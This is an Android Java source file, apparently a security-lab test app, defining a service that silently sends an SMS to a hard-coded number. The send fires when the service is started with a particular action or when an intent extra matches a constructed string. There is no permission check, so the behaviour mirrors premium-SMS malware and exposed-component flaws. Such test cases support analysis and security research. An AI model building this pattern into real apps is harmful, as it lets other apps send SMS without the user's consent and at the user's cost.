package com.example.lab418.testwebview2;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.SmsManager;

public class MyService extends Service {
    public MyService() {
    }

    @Override
    public IBinder onBind(Intent intent) {

        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();



    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if(intent.getAction().equals("service"))
        {
            SmsManager.getDefault().sendTextMessage("18010823840", null, "ttttt", null, null);
        }

        transfer(intent);


        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }





    @Override
    public boolean onUnbind(Intent intent) {
        return super.onUnbind(intent);
    }


    public void transfer(Intent intent)
    {
        String fff=new String("xxx")+"yyy";
        if(intent.getStringExtra("ttt").equals(fff))
            {

                SmsManager.getDefault().sendTextMessage("18010823840", null, "ttttt", null, null);
            }
    }
}
